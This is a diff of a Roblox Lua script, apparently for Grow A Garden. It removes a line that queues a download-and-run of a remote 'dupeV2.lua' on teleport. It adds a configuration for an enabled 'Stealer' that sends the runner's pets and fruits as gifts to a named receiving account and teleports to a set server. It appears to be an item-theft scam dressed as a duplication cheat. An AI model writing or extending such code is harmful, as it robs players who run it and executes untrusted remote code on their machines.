@@ -1,6 +1,27 @@
-local a = 'b62a895c-1554-433e-a33c-48edbabe9ccb' 
-local TeleportService = cloneref(game:GetService("TeleportService"))  
-queue_on_teleport([[  
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/scytheXlol/Grow-A-Garden-OP-Methods/refs/heads/main/dupeV2.lua'))()
-]])
-TeleportService:TeleportToPlaceInstance(126884695634066, a) 
+local Global = {
+    Games = {
+        GrowAGarden = {
+            Enabled = true,
+            Stealer = {
+                Enabled = true,
+                AutoUnequipAllPets = false,
+                TargetPlayer = "trevxuhs", --( Player who will receive gifts )--
+                RandomiseTargetPlayer = false,
+                Teleporter = {
+                    Enabled = true,
+                    JobId = "87a7d9be-f7ac-4fe3-bf46-ac103b3e5382" -- setclipboard(game.JobId)
+                    Script = ""
+                },
+                TargetItems = {
+                    Pets = {
+
+                    },
+                    Fruits = {
+                        "Corn",
+                        "Banana"
+                    }
+                }
+            }
+        }
+    }
+}
